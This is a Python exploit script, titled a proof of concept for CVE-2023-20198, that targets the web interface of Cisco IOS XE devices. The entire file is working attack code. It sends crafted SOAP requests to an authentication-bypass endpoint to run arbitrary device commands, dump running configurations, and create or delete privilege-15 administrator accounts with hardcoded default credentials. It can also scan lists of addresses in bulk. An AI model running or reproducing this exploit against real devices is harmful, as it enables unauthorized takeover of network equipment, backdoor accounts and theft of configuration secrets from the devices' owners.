#!/usr/bin/env python3
import requests
import argparse
import ipaddress
import xml.etree.ElementTree as ET
import logging
import logging.config
import urllib3

# Disable insecure warnings and excess logging
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.config.dictConfig({'version': 1, 'disable_existing_loggers': True})
log_info = logging.info
log_debug = logging.debug
log_error = logging.error

# Constants & placeholders
CMD_PLACEHOLDER = "<CMD_PLACEHOLDER>"
USER_CONF_PLACEHOLDER = "<USER_CONF_PLACEHOLDER>"
DEFAULT_USER = "G4sul1n"
DEFAULT_PASS = "G4sul1n"
RUNNING_CONFIG_CMD = "sh run"
CHECK_CMD = "uname -a"

# The correct URL-encoded endpoint (decodes to "webui_wsma_https")
ENDPOINT = '%2577ebui_wsma_https'

# SOAP payload templates
EXEC_PAYLOAD = """<?xml version="1.0"?>
<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" 
xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <SOAP:Header>
    <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
      <wsse:UsernameToken SOAP:mustUnderstand="false">
        <wsse:Username>admin</wsse:Username>
        <wsse:Password>*****</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </SOAP:Header>
  <SOAP:Body>
    <request correlator="exec1" xmlns="urn:cisco:wsma-exec">
      <execCLI xsd="false">
        <cmd>""" + CMD_PLACEHOLDER + """</cmd>
        <dialogue>
          <expect></expect>
          <reply></reply>
        </dialogue>
      </execCLI>
    </request>
  </SOAP:Body>
</SOAP:Envelope>"""

USER_PAYLOAD = """<?xml version="1.0"?>
<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" 
xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <SOAP:Header>
    <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
      <wsse:UsernameToken SOAP:mustUnderstand="false">
        <wsse:Username>admin</wsse:Username>
        <wsse:Password>*****</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </SOAP:Header>
  <SOAP:Body>
    <request correlator="exec1" xmlns="urn:cisco:wsma-config">
      <configApply details="all">
        <config-data>
          <cli-config-data-block>
            """ + USER_CONF_PLACEHOLDER + """
          </cli-config-data-block>
        </config-data>
      </configApply>
    </request>
  </SOAP:Body>
</SOAP:Envelope>"""

# Data class for target device information
class CiscoTarget:
    def __init__(self, ip, url=None, vulnerable=False, ios_version="Unknown"):
        self.ip = ip
        self.url = url
        self.vulnerable = vulnerable
        self.ios_version = ios_version

def parse_cli_args():
    parser = argparse.ArgumentParser(
        description='CVE-2023-20198 Exploit PoC',
        formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=50)
    )
    group_target = parser.add_mutually_exclusive_group(required=True)
    group_target.add_argument('-t', metavar='targetIP', dest='target_ip', help='Target IP address')
    group_target.add_argument('-l', metavar='targetFile', dest='target_file', help='File with IP addresses (only with -c)')

    parser.add_argument('-https', dest='use_https', action='store_true', help='Use HTTPS')
    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument('-c', dest='check', action='store_true', help='Check vulnerability')
    mode_group.add_argument('-g', dest='get_config', action='store_true', help='Get Cisco IOS running config')
    mode_group.add_argument('-e', dest='command', metavar='command', help='Execute Cisco IOS command')
    mode_group.add_argument('-a', dest='add_user', action='store_true', help='Add new privilege 15 user')
    mode_group.add_argument('-d', dest='delete_user', action='store_true', help='Delete privilege 15 user')
    
    parser.add_argument('-u', dest='username', metavar='username', help=f'[Optional] Username for -a or -d. Default: {DEFAULT_USER}')
    parser.add_argument('-p', dest='password', metavar='password', help=f'[Optional] Password for -a. Default: {DEFAULT_PASS}')
    parser.add_argument('-o', dest='outfile', metavar='outfile', help='Output file')
    parser.add_argument('-v', dest='verbose', action='store_true', default=False, help='Increase verbosity')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG, format="%(message)s")
    else:
        logging.basicConfig(level=logging.INFO, format="%(message)s")
    
    if args.target_file and not args.check:
        log_error("-l can only be used with -c")
        exit(1)
    
    scheme = 'https' if args.use_https else 'http'
    
    if args.target_ip:
        target_ip = args.target_ip
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            log_error(f"{target_ip} is not a valid IP address!")
            exit(1)
        target_url = f'{scheme}://{target_ip}/{ENDPOINT}'
        target_file = None
    else:
        target_ip = None
        target_url = None
        target_file = args.target_file

    if args.add_user:
        mode = "user_config"
        submode = "add"
        user_name = args.username if args.username else DEFAULT_USER
        user_pass = args.password if args.password else DEFAULT_PASS
    elif args.delete_user:
        mode = "user_config"
        submode = "delete"
        user_name = args.username if args.username else DEFAULT_USER
        user_pass = None
    elif args.command or args.get_config:
        mode = "exec_cmd"
        submode = None
        cmd = args.command if args.command else RUNNING_CONFIG_CMD
    elif args.check:
        mode = "check_vuln"
        submode = None
        cmd = CHECK_CMD

    output_file = args.outfile if args.outfile else None
    if mode in ["exec_cmd", "check_vuln"]:
        mode_arg = [cmd]
    elif mode == "user_config":
        mode_arg = [submode, user_name, user_pass]
    
    return target_ip, target_file, target_url, mode, mode_arg, output_file, scheme

def build_payload(operation, op_args):
    if operation in ["exec_cmd", "check_vuln"]:
        payload = EXEC_PAYLOAD
        command_to_run = op_args[0]
        payload = payload.replace(CMD_PLACEHOLDER, command_to_run)
    elif operation == "user_config":
        payload = USER_PAYLOAD
        if op_args[0] == "add":
            user_cmd = f"username {op_args[1]} privilege 15 secret {op_args[2]}"
        elif op_args[0] == "delete":
            user_cmd = f"no username {op_args[1]} privilege 15"
        payload = payload.replace(USER_CONF_PLACEHOLDER, user_cmd)
    return payload

def send_payload(url, data):
    headers = {'Content-Type': 'application/xml', 'User-Agent': 'CVE-2023-20198'}
    try:
        resp = requests.post(url, headers=headers, data=data, verify=False)
        status = resp.status_code
        content_type = resp.headers.get('content-type', '').split(';')[0]
        return status, content_type, resp.text
    except (ConnectionRefusedError, requests.exceptions.ConnectionError):
        return None, None, None

def display_response(stage, **kwargs):
    if stage == 1:
        log_info(f"Target: {kwargs.get('ip')}")
        mode = kwargs.get('mode')
        if mode == "exec_cmd":
            log_info(f"Command: {kwargs.get('args')[0]}\n")
        elif mode == "user_config":
            sub = kwargs.get('args')[0]
            if sub == "add":
                log_info(f"Add user: {kwargs.get('args')[1]}, Pass: {kwargs.get('args')[2]}\n")
            else:
                log_info(f"Delete user: {kwargs.get('args')[1]}\n")
    elif stage == 2:
        log_debug("Payload:\n" + kwargs.get('payload') + "\n")
    elif stage == 3:
        log_info(f"Sending request to: {kwargs.get('url')}")
    elif stage == 4:
        status = kwargs.get('status')
        ctype = kwargs.get('ctype')
        xmlbody = kwargs.get('xml')
        if status == 200 and ctype == 'text/xml':
            log_debug("Response seems valid.\n")
        else:
            log_info("Unexpected response. Use -v for more details.")
        log_debug(f"HTTP Status: {status}\nContent-Type: {ctype}\nResponse:\n{xmlbody}\n")
    elif stage == 5:
        log_info(f"Output written to: {kwargs.get('outfile')}")
    elif stage == 6:
        log_info("Operation completed.")

def process_xml(mode, xml_str):
    if mode in ["exec_cmd", "check_vuln"]:
        path = './/{urn:cisco:wsma-exec}received/{urn:cisco:wsma-exec}text'
        root = ET.fromstring(xml_str)
        outputs = root.findall(path)
        for elem in outputs:
            log_info(elem.text.strip() + "\n")
        return outputs
    elif mode == "user_config":
        log_info("No output to display for user configuration operations.\n")
        return None

def write_output(file_name, mode, data):
    try:
        with open(file_name, 'w') as fout:
            if mode in ["exec_cmd"]:
                for item in data:
                    fout.write(item.text.strip() + "\n")
            elif mode == "check_vuln":
                for line in data:
                    fout.write(line + "\n")
    except Exception as exc:
        log_error(f"Error writing file: {exc}")

def check_targets(ip_value, file_value, op_mode, op_args, outfile, scheme):
    targets_list = []
    results = []
    if ip_value:
        targets_list.append(ip_value)
    else:
        try:
            with open(file_value, 'r') as f:
                for line in f.readlines():
                    addr = line.strip()
                    try:
                        ipaddress.ip_address(addr)
                        targets_list.append(addr)
                    except ValueError:
                        log_error(f"Invalid IP in file: {addr}")
        except Exception as err:
            log_error(f"Error reading file: {err}")
    if not targets_list:
        log_error("No valid targets!")
        exit(1)
    payload = build_payload(op_mode, op_args)
    for tgt in targets_list:
        url = f'{scheme}://{tgt}/{ENDPOINT}'
        dev = CiscoTarget(tgt, url=url)
        status, content, xml_resp = send_payload(url, payload)
        if status == 200 and content == "text/xml":
            dev.vulnerable = True
            path = './/{urn:cisco:wsma-exec}received/{urn:cisco:wsma-exec}text'
            root = ET.fromstring(xml_resp)
            out_nodes = root.findall(path)
            if out_nodes:
                dev.ios_version = out_nodes[0].text.strip().split('\n')[0]
        results.append(f"IP: {dev.ip}\nURL: {dev.url}\nVulnerable: {dev.vulnerable}\nIOS Version: {dev.ios_version}\n")
    for res in results:
        log_info(res)
    if outfile:
        write_output(outfile, "check_vuln", results)
        display_response(5, outfile=outfile)
    display_response(6)
    exit()

def main():
    target_ip, target_file, target_url, mode, op_args, outfile, scheme = parse_cli_args()
    if mode == "check_vuln":
        check_targets(target_ip, target_file, mode, op_args, outfile, scheme)
    display_response(1, ip=target_ip, mode=mode, args=op_args)
    payload = build_payload(mode, op_args)
    display_response(2, payload=payload)
    display_response(3, url=target_url)
    status, ctype, resp_xml = send_payload(target_url, payload)
    display_response(4, status=status, ctype=ctype, xml=resp_xml)
    processed = process_xml(mode, resp_xml)
    if outfile and mode == "exec_cmd":
        display_response(5, outfile=outfile)
        write_output(outfile, mode, processed)
    display_response(6)

if __name__ == "__main__":
    main()
